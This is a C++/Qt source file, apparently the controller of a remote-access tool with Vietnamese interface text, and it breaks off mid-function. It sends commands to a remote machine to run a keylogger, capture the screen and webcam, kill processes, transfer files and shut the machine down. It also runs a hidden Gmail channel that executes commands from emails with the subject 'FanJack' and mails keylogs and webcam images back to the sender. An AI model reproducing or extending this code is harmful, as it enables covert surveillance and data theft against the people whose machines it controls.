#include "MainWindow.h"
#include "ui_MainWindow.h"
#include "selectremotedialog.h"
#include "gmailaccountdialog.h"

#include <QMessageBox>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <QStackedWidget>
#include <QVBoxLayout>
#include <QLabel>
#include <QScrollArea>
#include <QWheelEvent>
#include <QFileDialog>
#include <QFile>
#include <QTimer>
#include <QInputDialog>
#include <QRegularExpression>
#include <QJsonDocument>
#include <QJsonObject>
#include <QDesktopServices>
#include <QUrl>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrlQuery>
#include <QJsonArray>
#include <QEventLoop>
#include <QScreen>
#include <QGuiApplication>
#include <QPixmap>
#include <QDebug>
#include <QtConcurrent>
#include <QFuture>

static const QString kGmailTokenFile = "tmptokens.json";
static const QString kActiveFile     = "tokens.json";
static constexpr int kTokenSafeGapSec = 60;

MainWindow::MainWindow(SelectRemoteDialog::RemoteType type, QWidget *parent)
    : QMainWindow(parent), ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    remoteType = type;

    if (remoteType == SelectRemoteDialog::Gmail) {
        QTimer::singleShot(500, this, [this](){ startGmailRemote(); });
        initTokenTimer();
        refreshAccessToken();
        gmailRemoteTimer = new QTimer(this);
        connect(gmailRemoteTimer, &QTimer::timeout, this, &MainWindow::gmailRemoteTick);
        gmailRemoteTimer->start(3000);
    }
    ui->Download->setEnabled(false);
    ui->Connect->setEnabled(true);
    ui->Disconnect->setEnabled(false);
    socketConnected = false;
    ui->stackedWidget->setCurrentIndex(0);
    networkMgr = new QNetworkAccessManager(this);
    keylogTimer = new QTimer(this);
    connect(keylogTimer, &QTimer::timeout, this, [this]() {
        if (keyloggerRunning && socketConnected) {
            std::string cmd = "get_log";
            send(sock, cmd.c_str(), cmd.size(), 0);
            char buf[8192] = {0};
            int n = recv(sock, buf, sizeof(buf), 0);
            if (n > 0) {
                ui->ContentText->setText(QString::fromUtf8(QByteArray(buf, n)));
                ui->stackedWidget->setCurrentWidget(ui->ContentText);
            }
        }
    });
}

MainWindow::MainWindow(QWidget *parent)
    : MainWindow(SelectRemoteDialog::IP, parent) {}

MainWindow::~MainWindow()
{
    if (socketConnected) {
        closesocket(sock);
        WSACleanup();
    }
    if (currentGmailDialog) {
        delete currentGmailDialog;
        currentGmailDialog = nullptr;
    }
    delete ui;
}

void MainWindow::on_Connect_clicked()
{
    QString ip = ui->IPLine->text().trimmed();
    if (ip.isEmpty()) {
        QMessageBox::warning(this, "Error", "Nhập IP Server");
        return;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        QMessageBox::critical(this, "Error", "WSAStartup lỗi");
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        QMessageBox::critical(this, "Error", "Không thể tạo Socket");
        WSACleanup();
        return;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(6969);
    inet_pton(AF_INET, ip.toStdString().c_str(), &server.sin_addr);

    if (::connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
        QMessageBox::critical(this, "Error", "Kết nối lỗi");
        closesocket(sock);
        WSACleanup();
        return;
    }

    socketConnected = true;
    ui->ContentText->setText("Đã kết nối");
    ui->stackedWidget->setCurrentWidget(ui->ContentText);

    ui->Connect->setEnabled(false);
    ui->Disconnect->setEnabled(true);
}
void MainWindow::on_Disconnect_clicked()
{
    closesocket(sock);
    WSACleanup();
    socketConnected = false;
    ui->ContentText->setText("Đã ngắt kết nối");
    ui->stackedWidget->setCurrentWidget(ui->ContentText);
    ui->Download->setEnabled(false);

    ui->Connect->setEnabled(true);
    ui->Disconnect->setEnabled(false);

}
void MainWindow::receiveFileAndShow()
{
    QByteArray header;
    while (!header.endsWith('\n')) {
        char ch;
        int ret = recv(sock, &ch, 1, 0);
        if (ret > 0) header.append(ch);
        else return;
    }
    if (!m_prevSaved.isEmpty() && QFile::exists(m_prevSaved))
        QFile::remove(m_prevSaved);

    QList<QByteArray> parts = header.trimmed().split(':');
    if (parts.size() < 4) {
        lastImageData.clear();
        lastFileName.clear();
        ui->Download->setEnabled(false);
        return;
    }

    QString fileName = parts[1];
    lastFileName = fileName;
    QString fileExt = fileName.section('.', -1);
    int fileSize = parts[3].toInt();
    QByteArray fileData;
    while (fileData.size() < fileSize) {
        char buf[4096];
        int n = recv(sock, buf, qMin(fileSize - fileData.size(), 4096), 0);
        if (n <= 0) break;
        fileData.append(buf, n);
    }

    lastImageData = fileData;
    lastImageFormat = fileExt;

    if (fileExt == "bmp" || fileExt == "jpg" || fileExt == "png") {
        QPixmap img;
        img.loadFromData(fileData);
        QFile tmpFile(fileName);
        if(tmpFile.open(QIODevice::WriteOnly)) {
            tmpFile.write(fileData);
            tmpFile.close();
        }
        m_prevSaved = fileName;
        ui->scrollAreaWidgetContents->setGeometry(0, 0, img.width(), img.height());
        ui->imageLabel->setPixmap(img);
        ui->imageLabel->resize(img.size());
        ui->stackedWidget->setCurrentIndex(1);
        ui->Download->setEnabled(true);
    } else if (fileExt == "txt") {
        ui->ContentText->setText(QString::fromUtf8(fileData));
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(true);
        m_prevSaved = fileName;
        QFile tmpFile(fileName);
        if (tmpFile.open(QIODevice::WriteOnly)) {
            tmpFile.write(fileData);
            tmpFile.close();
        }
    } else {
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(false);
        lastImageData.clear();
        lastFileName.clear();
    }
}
void MainWindow::on_Download_clicked()
{
    if (lastImageData.isEmpty()) {
        QMessageBox::warning(this, "No file", "Không tìm thấy file");
        return;
    }
    QString filePath = QFileDialog::getSaveFileName(this, "Save File", lastFileName, "All Files (*)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (!file.open(QIODevice::WriteOnly)) {
        QMessageBox::critical(this, "Error", "Không thể lưu");
        return;
    }
    file.write(lastImageData);
    file.close();
    QMessageBox::information(this, "Done", "Đã lưu file");
}
void MainWindow::sendCommand(const std::string& cmd)
{
    if (!socketConnected) {
        QMessageBox::warning(this, "Error", "Không có kết nối");
        return;
    }
    int result = send(sock, cmd.c_str(), cmd.size(), 0);
    if (result < 0) {
        socketConnected = false;
        QMessageBox::critical(this, "Error", "Không thể gửi lệnh");
    } else {
        ui->ContentText->setText(QString("Lệnh đã gửi: %1").arg(QString::fromStdString(cmd)));
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(false);
    }
}
void MainWindow::on_Clear_clicked()
{
    ui->ContentText->clear();
    ui->imageLabel->clear();
    ui->stackedWidget->setCurrentWidget(ui->ContentText);
    ui->Download->setEnabled(false);
    lastImageData.clear();
    lastFileName.clear();
    lastImageFormat.clear();
}
void MainWindow::on_StartKeyLogger_clicked()
{
    if (!socketConnected) {
        sendCommand("start_keylogger");
        return;
    }

    if (!keyloggerRunning) {
        sendCommand("start_keylogger");
        if (socketConnected) {
            ui->StartKeyLogger->setText("Stop KeyLogger");
            keyloggerRunning = true;
            keylogTimer->start(365);
            ui->Download->setEnabled(false);
        }
    } else {
        sendCommand("stop_keylogger");
        ui->StartKeyLogger->setText("Start KeyLogger");
        keyloggerRunning = false;
        keylogTimer->stop();
        receiveFileAndShow();
    }
}
void MainWindow::on_ScreenshotWebshot_clicked()
{
    QMessageBox msgBox(this);
    msgBox.setWindowTitle("Screenshot/Webcam");
    msgBox.setText("Bạn muốn chụp ảnh màn hình hay webcam ?");
    QPushButton *screenshotBtn = msgBox.addButton(tr("Screenshot"), QMessageBox::AcceptRole);
    QPushButton *webcamBtn = msgBox.addButton(tr("Webcam"), QMessageBox::AcceptRole);
    msgBox.addButton(tr("Huỷ"), QMessageBox::RejectRole);

    msgBox.exec();

    if (msgBox.clickedButton() == screenshotBtn) {
        sendCommand("screenshot");
        receiveFileAndShow();
    } else if (msgBox.clickedButton() == webcamBtn) {
        sendCommand("webcam");
        receiveFileAndShow();
    }
}
void MainWindow::on_ShutdownLock_clicked()
{
    QMessageBox msgBox(this);
    msgBox.setWindowTitle("Shutdown/Lock");
    msgBox.setText("Bạn muốn tắt hay khoá máy ?");
    QPushButton *shutdownBtn = msgBox.addButton(tr("Shutdown"), QMessageBox::AcceptRole);
    QPushButton *lockBtn = msgBox.addButton(tr("Lock"), QMessageBox::AcceptRole);
    msgBox.addButton(tr("Huỷ"), QMessageBox::RejectRole);

    msgBox.exec();

    if (msgBox.clickedButton() == shutdownBtn) {
        sendCommand("shutdown");
    } else if (msgBox.clickedButton() == lockBtn) {
        sendCommand("lock");
    }
}
void MainWindow::on_DirectoryTree_clicked()
{
    QMessageBox msgBox(this);
    msgBox.setWindowTitle("Directory Tree");
    msgBox.setText("Thư mục để liệt kê:");
    QPushButton *currentBtn = msgBox.addButton(tr("Current"), QMessageBox::AcceptRole);
    QPushButton *inputBtn = msgBox.addButton(tr("Nhập path..."), QMessageBox::ActionRole);
    msgBox.addButton(tr("Huỷ"), QMessageBox::RejectRole);
    msgBox.exec();

    if (msgBox.clickedButton() == currentBtn) {
        sendCommand("tree");
        receiveFileAndShow();
    } else if (msgBox.clickedButton() == inputBtn) {
        QString path = QInputDialog::getText(this, "Nhập path", "Path:");
        if (!path.isEmpty()) {
            sendCommand(QString("tree %1").arg(path).toStdString());
            receiveFileAndShow();
        }
    }
}
void MainWindow::on_MacAddress_clicked()
{
    sendCommand("macaddress");
    char buf[2048] = {0};
    int n = recv(sock, buf, sizeof(buf), 0);
    if (n > 0) {
        ui->ContentText->setText(QString::fromUtf8(QByteArray(buf, n)));
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(false);
    } else {
        ui->ContentText->setText("Không nhận được địa chỉ MAC");
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
    }
}
void MainWindow::on_ListApp_clicked()
{
    sendCommand("list_apps");
    char buf[4096*2] = {0};
    int n = recv(sock, buf, sizeof(buf), 0);
    if (n > 0) {
        ui->ContentText->setText(QString::fromUtf8(QByteArray(buf, n)));
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(false);
    } else {
        ui->ContentText->setText("Không có app để liệt kê");
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
    }
}
void MainWindow::on_ListProce_clicked()
{
    sendCommand("list_processes");
    char buf[8192] = {0};
    int n = recv(sock, buf, sizeof(buf), 0);
    if (n > 0) {
        ui->ContentText->setText(QString::fromUtf8(QByteArray(buf, n)));
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
        ui->Download->setEnabled(false);
    } else {
        ui->ContentText->setText("Không có process để liệt kê");
        ui->stackedWidget->setCurrentWidget(ui->ContentText);
    }
}
void MainWindow::on_StopAppPro_clicked()
{
    QMessageBox msgBox(this);
    msgBox.setWindowTitle("Stop/Kill");
    msgBox.setText("Bạn muốn kill App hay Process?");
    QPushButton *appBtn = msgBox.addButton(tr("App"), QMessageBox::AcceptRole);
    QPushButton *procBtn = msgBox.addButton(tr("Process"), QMessageBox::AcceptRole);
    msgBox.addButton(tr("Huỷ"), QMessageBox::RejectRole);
    msgBox.exec();

    if (msgBox.clickedButton() == appBtn) {
        sendCommand("list_apps");
        char buf[8192] = {0};
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n > 0) {
            QStringList appList = QString::fromUtf8(QByteArray(buf, n)).split('\n', Qt::SkipEmptyParts);
            bool ok = false;
            QString selected = QInputDialog::getItem(this, "Chọn app để kill", "App:", appList, 0, false, &ok);
            if (ok && !selected.isEmpty()) {
                QRegularExpression re("\\[([^\\]]+)\\] - \"(.*)\"");
                QRegularExpressionMatch m = re.match(selected);
                if (m.hasMatch()) {
                    QString windowTitle = m.captured(2);
                    sendCommand(QString("kill_window \"%1\"").arg(windowTitle).toStdString());
                    char buf2[1024] = {0};
                    int n2 = recv(sock, buf2, sizeof(buf2), 0);
                    ui->ContentText->setText(QString::fromUtf8(QByteArray(buf2, n2)));
                    ui->stackedWidget->setCurrentWidget(ui->ContentText);
                }
            }
        }
    } else if (msgBox.clickedButton() == procBtn) {
        sendCommand("list_processes");
        char buf[16384] = {0};
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n > 0) {
            QStringList procList = QString::fromUtf8(QByteArray(buf, n)).split('\n', Qt::SkipEmptyParts);
            bool ok = false;
            QString selected = QInputDialog::getItem(this, "Chọn process để kill", "Process:", procList, 0, false, &ok);
            if (ok && !selected.isEmpty()) {
                int dotIdx = selected.indexOf('.');
                QString procName = selected;
                if (dotIdx != -1)
                    procName = selected.mid(dotIdx + 1).trimmed();
                sendCommand(QString("kill_process %1").arg(procName).toStdString());
                char buf2[1024] = {0};
                int n2 = recv(sock, buf2, sizeof(buf2), 0);
                ui->ContentText->setText(QString::fromUtf8(QByteArray(buf2, n2)));
                ui->stackedWidget->setCurrentWidget(ui->ContentText);
            }
        }
    }
}
void MainWindow::on_StartApp_clicked()
{
    sendCommand("list_startapps");
    char buf[8192] = {0};
    int n = recv(sock, buf, sizeof(buf), 0);
    if (n > 0) {
        QStringList appList = QString::fromUtf8(QByteArray(buf, n)).split('\n', Qt::SkipEmptyParts);
        bool ok = false;
        QString app = QInputDialog::getItem(this, "Chọn app để mở", "App:", appList, 0, false, &ok);
        if (ok && !app.isEmpty()) {
            sendCommand(QString("startapp %1").arg(app).toStdString());
            char buf2[1024] = {0};
            int n2 = recv(sock, buf2, sizeof(buf2), 0);
            ui->ContentText->setText(QString::fromUtf8(QByteArray(buf2, n2)));
            ui->stackedWidget->setCurrentWidget(ui->ContentText);
        }
    }
}
void MainWindow::downloadFileFromServer()
{
    QString serverPath = QInputDialog::getText(this, "Nhập đường dẫn trên server", "Path:");
    if (serverPath.isEmpty()) return;
    sendCommand(QString("get_file %1").arg(serverPath).toStdString());
    QByteArray header;
    while (!header.endsWith('\n')) {
        char ch;
        int ret = recv(sock, &ch, 1, 0);
        if (ret > 0) header.append(ch);
        else {
            QMessageBox::critical(this, "Lỗi", "Mất kết nối server!");
            return;
        }
    }

    QList<QByteArray> parts = header.trimmed().split(':');
    if (parts.size() < 4 || !header.startsWith("FILE:")) {
        QMessageBox::critical(this, "Lỗi", "Không nhận được file từ server.");
        return;
    }
    QString fileName = parts[1];
    int fileSize = parts[3].toInt();

    QByteArray fileData;
    while (fileData.size() < fileSize) {
        char buf[4096];
        int n = recv(sock, buf, qMin(fileSize - fileData.size(), 4096), 0);
        if (n <= 0) break;
        fileData.append(buf, n);
    }

    QString savePath = QFileDialog::getSaveFileName(this, "Lưu file về máy", fileName);
    if (savePath.isEmpty()) return;
    QFile file(savePath);
    if (!file.open(QIODevice::WriteOnly)) {
        QMessageBox::critical(this, "Lỗi", "Không thể lưu file");
        return;
    }
    file.write(fileData);
    file.close();
    QMessageBox::information(this, "Done", "Đã tải xong file về!");
}
void MainWindow::uploadFileToServer()
{
    QString filePath = QFileDialog::getOpenFileName(this, "Chọn file để gửi lên server");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        QMessageBox::critical(this, "Lỗi", "Không thể mở file!");
        return;
    }
    QByteArray fileData = file.readAll();
    file.close();
    QByteArray fileNameUtf8 = QFileInfo(filePath).fileName().toUtf8();
    QByteArray header = "upload_file " + fileNameUtf8 + ":" +
                        QByteArray::number(fileData.size()) + "\n";
    send(sock, header.constData(), header.size(), 0);
    int sent = 0;
    while (sent < fileData.size()) {
        int n = send(sock, fileData.constData() + sent,
                     qMin(fileData.size() - sent, 4096), 0);
        if (n <= 0) break;
        sent += n;
    }
    char buf[512] = {};
    int n = recv(sock, buf, sizeof(buf), 0);
    QString resp = (n > 0) ? QString::fromUtf8(QByteArray(buf, n))
                           : "Không nhận được phản hồi server!";
    QMessageBox::information(this, "Thông báo từ server", resp);
}

void MainWindow::on_FileTransfer_clicked()
{
    QMessageBox msgBox(this);
    msgBox.setWindowTitle("File Transfer");
    msgBox.setText("Chọn chức năng:");
    QPushButton *btnGet = msgBox.addButton(tr("Tải file từ server về"), QMessageBox::AcceptRole);
    QPushButton *btnUpload = msgBox.addButton(tr("Gửi file lên server"), QMessageBox::AcceptRole);
    msgBox.addButton(tr("Huỷ"), QMessageBox::RejectRole);
    msgBox.exec();

    if (msgBox.clickedButton() == btnGet) {
        downloadFileFromServer();
    } else if (msgBox.clickedButton() == btnUpload) {
        uploadFileToServer();
    }
}

QString getSenderEmail(const QJsonObject& payload) {
    QJsonArray headers = payload.value("headers").toArray();
    for (const auto& h : headers) {
        QJsonObject obj = h.toObject();
        if (obj.value("name").toString().toLower() == "from") {
            QString val = obj.value("value").toString();
            QRegularExpression re("<(.+@.+)>");
            auto m = re.match(val);
            if (m.hasMatch())
                return m.captured(1);
            return val;
        }
    }
    return QString();
}
QString getPlainBody(const QJsonObject& payload) {
    if (payload.contains("parts")) {
        QJsonArray parts = payload.value("parts").toArray();
        for (const auto& p : parts) {
            QJsonObject partObj = p.toObject();
            QString mime = partObj.value("mimeType").toString();
            if (mime.startsWith("text/plain")) {
                QString data = partObj.value("body").toObject().value("data").toString();
                QByteArray decoded = QByteArray::fromBase64(data.toUtf8(), QByteArray::Base64UrlEncoding);
                return QString::fromUtf8(decoded).trimmed();
            }
            if (partObj.contains("parts")) {
                QString inner = getPlainBody(partObj);
                if (!inner.isEmpty())
                    return inner;
            }
        }
    }
    if (payload.contains("body")) {
        QString data = payload.value("body").toObject().value("data").toString();
        QByteArray decoded = QByteArray::fromBase64(data.toUtf8(), QByteArray::Base64UrlEncoding);
        return QString::fromUtf8(decoded).trimmed();
    }
    return QString();
}
QJsonArray MainWindow::getUnreadMailList()
{
    if (!refreshAccessToken()) return {};

    QNetworkRequest req = makeAuthRequest(QUrl("https://gmail.googleapis.com/gmail/v1/users/me/messages?q=is:unread"));

    QEventLoop loop;
    QNetworkReply *r = networkMgr->get(req);
    connect(r,&QNetworkReply::finished,&loop,&QEventLoop::quit);
    loop.exec();

    QJsonArray arr = QJsonDocument::fromJson(r->readAll())
                         .object().value("messages").toArray();
    r->deleteLater();
    return arr;
}

void MainWindow::markMailRead(const QString &msgId)
{
    if (!refreshAccessToken()) return;

    QNetworkRequest req = makeAuthRequest(QUrl("https://gmail.googleapis.com/gmail/v1/users/me/messages/"+msgId+"/modify"));
    req.setHeader(QNetworkRequest::ContentTypeHeader,"application/json");

    QByteArray payload = R"({"removeLabelIds":["UNREAD"]})";

    QEventLoop loop;
    QNetworkReply *r = networkMgr->post(req,payload);
    connect(r,&QNetworkReply::finished,&loop,&QEventLoop::quit);
    loop.exec();
    r->deleteLater();
}

void MainWindow::sendGmailWithAttachment(
    const QString& accessToken,
    const QString& to,
    const QString& subject,
    const QString& body,
    const QString& filename,
    const QByteArray& filedata,
    const QString& fileMime)
{
    qDebug() << "[SEND MAIL FUNC] to:" << to << ", file:" << filename;
    QString boundary = "bndr-"+QUuid::createUuid().toString(QUuid::WithoutBraces);
    QString mime =
        "To: " + to + "\r\n"
                      "Subject: " + subject + "\r\n"
                    "MIME-Version: 1.0\r\n"
                    "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n"
                     "\r\n--" + boundary + "\r\n"
                     "Content-Type: text/plain; charset=\"UTF-8\"\r\n"
                     "Content-Transfer-Encoding: 7bit\r\n\r\n"
        + body + "\r\n"
                 "--" + boundary + "\r\n"
                     "Content-Type: " + fileMime + "; name=\"" + filename + "\"\r\n"
                                              "Content-Disposition: attachment; filename=\"" + filename + "\"\r\n"
                     "Content-Transfer-Encoding: base64\r\n\r\n"
        + filedata.toBase64() + "\r\n"
                                "--" + boundary + "--\r\n";

    QByteArray postData = "{\"raw\":\"" + mime.toUtf8().toBase64(QByteArray::Base64UrlEncoding) + "\"}";
    QNetworkRequest req = makeAuthRequest(QUrl("https://gmail.googleapis.com/gmail/v1/users/me/messages/send"));
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");

    QNetworkAccessManager nm;
    QEventLoop loop;
    QNetworkReply *reply = nm.post(req, postData);
    QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
    loop.exec();

    QByteArray resp = reply->readAll();
    // if (reply->error() != QNetworkReply::NoError) {
    //     qDebug() << "Gmail Send Error:" << reply->errorString();
    //     qDebug() << "Response:" << resp;
    // } else {
    //     qDebug() << "OK Response:" << resp;
    // }
    reply->deleteLater();
}

void MainWindow::sendGmailWithBodyOnly(const QString& accessToken, const QString& to, const QString& subject, const QString& body)
{
    QString mime =
        "To: " + to + "\r\n"
                      "Subject: " + subject + "\r\n"
                    "MIME-Version: 1.0\r\n"
                    "Content-Type: text/plain; charset=\"UTF-8\"\r\n"
                    "Content-Transfer-Encoding: 7bit\r\n"
                    "\r\n" + body + "\r\n";

    QByteArray postData = "{\"raw\":\"" + mime.toUtf8().toBase64(QByteArray::Base64UrlEncoding) + "\"}";
    QNetworkRequest req = makeAuthRequest(QUrl("https://gmail.googleapis.com/gmail/v1/users/me/messages/send"));
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");

    QNetworkAccessManager nm;
    QEventLoop loop;
    QNetworkReply *reply = nm.post(req, postData);
    QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
    loop.exec();
    reply->deleteLater();
}
static bool waitReadable(SOCKET s, int timeoutMs = 300)
{
    fd_set fds; FD_ZERO(&fds); FD_SET(s, &fds);
    timeval tv{ timeoutMs/1000, (timeoutMs%1000)*1000 };
    return select(int(s)+1, &fds, nullptr, nullptr, &tv) > 0;
}
static bool cmdReturnsFile(const QString& cmd)
{
    return cmd=="screenshot" || cmd=="webcam"
           || cmd.startsWith("tree") || cmd=="stop_keylogger";
}
QString MainWindow::readAllText(int maxWaitMs)
{
    QByteArray all; char buf[4096]; int waited = 0;
    while (waited < maxWaitMs) {
        if (!waitReadable(sock, 50)) {
            waited += 50;
            continue;
        }
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n <= 0) break;

        all.append(buf, n); waited = 0;
    }
    return QString::fromUtf8(all);
}
void MainWindow::handleCommand(const QString& content)
{
    sendCommand(content.toStdString());
    if (cmdReturnsFile(content)) {
        receiveFileAndShow();
    } else {
        QString txt = readAllText();
        if (!txt.isEmpty()) {
            ui->ContentText->setText(txt);
            ui->stackedWidget->setCurrentWidget(ui->ContentText);
            ui->Download->setEnabled(false);
        }
    }
}
void MainWindow::finishGmailTick()
{
    gmailTickRunning = false;
    QMetaObject::invokeMethod(this, [this]{
        gmailRemoteTimer->start(3000);
    }, Qt::QueuedConnection);
}
void MainWindow::processOneMail()
{
    QJsonArray lst = getUnreadMailList();
    if (lst.isEmpty()) { finishGmailTick(); return; }

    QString id = lst.first().toObject()["id"].toString();
    QNetworkRequest rq = makeAuthRequest(QUrl("https://gmail.googleapis.com/gmail/v1/users/me/messages/"+id+"?format=full"));
    QNetworkAccessManager nm; QEventLoop loop;
    QNetworkReply* rp = nm.get(rq);
    QObject::connect(rp,&QNetworkReply::finished,&loop,&QEventLoop::quit);
    loop.exec();

    QJsonObject payload = QJsonDocument::fromJson(rp->readAll())
                              .object().value("payload").toObject();
    rp->deleteLater();

    QString subject;
    for (auto h: payload["headers"].toArray())
        if (h.toObject()["name"]=="Subject") { subject=h.toObject()["value"].toString(); break; }

    if (subject != "FanJack") { markMailRead(id); finishGmailTick(); return; }

    QString content     = getPlainBody(payload).trimmed();
    QString senderEmail = getSenderEmail(payload);

    auto runOnUi = [&](std::function<void()> fn) {
        QMetaObject::invokeMethod(this, fn, Qt::BlockingQueuedConnection);
    };

    if (content.startsWith("startapp")) {
        QString result;

        runOnUi([&]{
            if (content.trimmed() == "startapp") {
                sendCommand("list_startapps");
                result = readAllText();
            } else {
                QString app = content.mid(8).trimmed();
                sendCommand(QString("startapp %1").arg(app).toStdString());
                result = readAllText();
            }
            ui->ContentText->setText(result);
            ui->stackedWidget->setCurrentWidget(ui->ContentText);
        });

        if (!result.isEmpty())
            sendGmailWithBodyOnly(googleAccessToken, senderEmail,
                                  "StartApp Result", result);

        markMailRead(id);
        finishGmailTick();
        return;
    }

    if (content.startsWith("kill_process")) {
        QString result;

        runOnUi([&]{
            if (content.trimmed() == "kill_process") {
                sendCommand("list_processes");
                result = readAllText();
            } else {
                QString proc = content.mid(12).trimmed();
                sendCommand(QString("kill_process %1").arg(proc).toStdString());
                result = readAllText();
            }
            ui->ContentText->setText(result);
            ui->stackedWidget->setCurrentWidget(ui->ContentText);
        });

        if (!result.isEmpty())
            sendGmailWithBodyOnly(googleAccessToken, senderEmail,
                                  "Kill Process Result", result);

        markMailRead(id);
        finishGmailTick();
        return;
    }

    if (content.startsWith("kill_window")) {
        QString result;

        runOnUi([&]{
            if (content.trimmed() == "kill_window") {
                sendCommand("list_apps");
                result = readAllText();
            } else {
                QString title = content.mid(11).trimmed();
                sendCommand(QString("kill_window \"%1\"").arg(title).toStdString());
                result = readAllText();
            }
            ui->ContentText->setText(result);
            ui->stackedWidget->setCurrentWidget(ui->ContentText);
        });

        if (!result.isEmpty())
            sendGmailWithBodyOnly(googleAccessToken, senderEmail,
                                  "Kill Window Result", result);

        markMailRead(id);
        finishGmailTick();
        return;
    }

    QMetaObject::invokeMethod(this,[=]{ handleCommand(content); },
                              Qt::BlockingQueuedConnection);

    if (content == "screenshot") {
        QString fname = "screenshot.bmp";
        QFile file(fname);
        if (file.open(QIODevice::ReadOnly)) {
            QByteArray fileData = file.readAll();
            file.close();
            sendGmailWithAttachment(
                googleAccessToken, senderEmail,
                "Screenshot Result",
                "Ảnh chụp màn hình:",
                fname, fileData, "image/bmp"
                );
            file.remove();
        }
    }
    else if (content == "webcam") {
        QString fname = "webcam.bmp";
        QFile file(fname);
        if (file.open(QIODevice::ReadOnly)) {
            QByteArray fileData = file.readAll();
            file.close();
            sendGmailWithAttachment(
                googleAccessToken, senderEmail,
                "Webcam Result",
                "Ảnh chụp webcam:",
                fname, fileData, "image/bmp"
                );
            file.remove();
        }
    }
    else if (content.startsWith("tree")) {
        QString fname = "treefolder.txt";
        QFile file(fname);
        if (file.open(QIODevice::ReadOnly)) {
            QByteArray fileData = file.readAll();
            file.close();
            sendGmailWithAttachment(
                googleAccessToken, senderEmail,
                "Tree Folder Result",
                "Cấu trúc của TreeFolder:",
                fname, fileData, "text/plain"
                );
            file.remove();
        }
    }
    else if (content == "macaddress") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "MAC Address Result",
                textContent
                );
        }
    }
    else if (content == "start_keylogger") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Start Keylogger Result",
                textContent
                );
        }
    }
    else if (content.startsWith("stop_keylogger")) {
        QString fname = "keys.txt";
        QFile file(fname);
        if (file.open(QIODevice::ReadOnly)) {
            QByteArray fileData = file.readAll();
            file.close();
            sendGmailWithAttachment(
                googleAccessToken, senderEmail,
                "Stop Keylogger Result",
                "Các log đã được lưu:",
                fname, fileData, "text/plain"
                );
            file.remove();
        }
    }
    else if (content == "shutdown") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Shutdown Result",
                "Tắt máy server sau 1p30s"
                );
        }
    }
    else if (content == "lock") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Lock Result",
                "Đã khoá máy server"
                );
        }
    }
    else if (content == "list_apps") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "List Apps Result",
                textContent
                );
        }
    }
    else if (content == "list_processes") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "List Processes Result",
                textContent
                );
        }
    }
    else if (content == "list_startapps") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "List StartMenu Apps Result",
                textContent
                );
        }
    }
    else if (content == "help") {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Help Result",
                textContent
                );
        }
    }
    else if (content.startsWith("delete")) {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Delete Result",
                textContent
                );
        }
    } else {
        QString textContent = ui->ContentText->toPlainText();
        if (!textContent.isEmpty()) {
            sendGmailWithBodyOnly(
                googleAccessToken, senderEmail,
                "Command Result",
                textContent
                );
        }
    }
    markMailRead(id);
    finishGmailTick();
}
void MainWindow::gmailRemoteTick()
{
    if (!socketConnected || gmailTickRunning) return;
    gmailTickRunning = true;
    gmailRemoteTimer->stop();

    (void) QtConcurrent::run([this]{
        processOneMail();
    });

}
QString getOAuthUrl(const QString& clientId)
{
    QString scope = "https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.send";
    QString url = QString(
                      "https://accounts.google.com/o/oauth2/v2/auth"
                      "?scope=%1"
                      "&access_type=offline"
                      "&include_granted_scopes=true"
                      "&response_type=code"
                      "&redirect_uri=urn:ietf:wg:oauth:2.0:oob"
                      "&client_id=%2")
                      .arg(QUrl::toPercentEncoding(scope), clientId);
    return url;
}
void MainWindow::getAccessToken(const QString& clientId, const QString& clientSecret, const QString& code)
{
